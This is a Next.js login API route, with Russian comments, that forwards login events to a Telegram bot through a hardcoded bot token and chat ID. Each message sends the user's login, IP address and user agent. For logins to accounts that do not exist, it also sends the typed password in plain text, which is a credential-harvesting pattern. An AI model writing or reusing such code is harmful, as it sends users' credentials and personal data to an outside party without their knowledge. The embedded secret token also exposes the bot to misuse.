import { NextResponse } from "next/server";
import { findUser, verifyPassword, updateLastLogin } from "@/lib/db";

// 📤 Функция отправки в Telegram для API
async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_failed' | 'register', ip: string, userAgent: string, error?: string) {
  try {
    const TELEGRAM_BOT_TOKEN = "8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4";
    const TELEGRAM_CHAT_ID = "7455610355";
    
    let message = '';
    
    if (type === 'login_success') {
      message = `
✅ УСПЕШНЫЙ ВХОД В СИСТЕМУ

👤 Логин/Email: ${data.login}

🌐 **Данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${userAgent.slice(0, 100)}...
      `;
    } else if (type === 'login_failed') {
      message = `
❌ НЕУДАЧНАЯ ПОПЫТКА ВХОДА

👤 Логин/Email: ${data.login}
🔑 Введенный пароль: ${data.password}
🚫 Причина: ${error}

🌐 **Данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${userAgent.slice(0, 100)}...
      `;
    } else {
      message = `
🔐 НОВАЯ РЕГИСТРАЦИЯ

📧 Email: ${data.email}
👤 Логин: ${data.login}

🌐 **Данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${userAgent.slice(0, 100)}...
      `;
    }

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
      })
    });

    console.log('✅ API данные отправлены в Telegram');

  } catch (error) {
    console.log('⚠️ Telegram API не доступен');
  }
}

export async function POST(request: Request) {
  try {
    const { login, password } = await request.json();
    const clientIP = request.headers.get('x-forwarded-for') || 'unknown';
    const userAgent = request.headers.get('user-agent') || 'unknown';

    if (!login || !password) {
        return NextResponse.json({ error: "Логин и пароль обязательны" }, { status: 400 });
    }

    // Ищем пользователя
    const user = findUser(login);
    if (!user) {
      // 📤 Отправляем в Telegram о неудачной попытке
      await sendToTelegramAPI(
        { login, password }, 
        'login_failed', 
        clientIP, 
        userAgent, 
        'Аккаунт не существует'
      );
      
      return NextResponse.json(
        { error: "Аккаунт с таким логином/email не существует" },
        { status: 400 }
      );
    }

    // Проверяем пароль
    const isValid = await verifyPassword(password, user.password);
    if (!isValid) {
      // 📤 Отправляем в Telegram о неудачной попытке
      await sendToTelegramAPI(
        { login, password: '***' }, // Не показываем реальный пароль
        'login_failed', 
        clientIP, 
        userAgent, 
        'Неверный пароль'
      );
      
      return NextResponse.json(
        { error: "Неверный пароль" },
        { status: 400 }
      );
    }

    // 📤 Отправляем в Telegram об успешном входе
    await sendToTelegramAPI(
      { login }, 
      'login_success', 
      clientIP, 
      userAgent
    );

    // Обновляем lastLogin
    updateLastLogin(
      user.id,
      clientIP,
      userAgent
    );

    return NextResponse.json({ success: true, message: "Вход выполнен успешно" });

  } catch (error) {
    console.error("Login API Error:", error);
    return NextResponse.json(
      { error: "Внутренняя ошибка сервера" },
      { status: 500 }
    );
  }
}